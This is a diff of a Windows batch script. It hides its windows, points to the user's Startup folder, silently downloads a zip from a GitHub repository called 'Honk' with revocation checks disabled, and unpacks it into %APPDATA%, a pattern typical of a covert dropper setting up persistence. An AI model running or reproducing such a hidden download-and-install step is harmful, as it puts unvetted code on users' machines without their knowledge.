@@ -1,4 +1,5 @@
 @echo off
+powershell -window minimized -command ""
 set "Startup_Dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 start /WAIT /MIN cmd /C "curl "https://github.com/glonpl/Honk/archive/refs/heads/main.zip" --ssl-no-revoke -L -o %TEMP%\temp.zip"
 start /WAIT /MIN powershell -Command "Expand-Archive %TEMP%\temp.zip -DestinationPath %APPDATA%" 
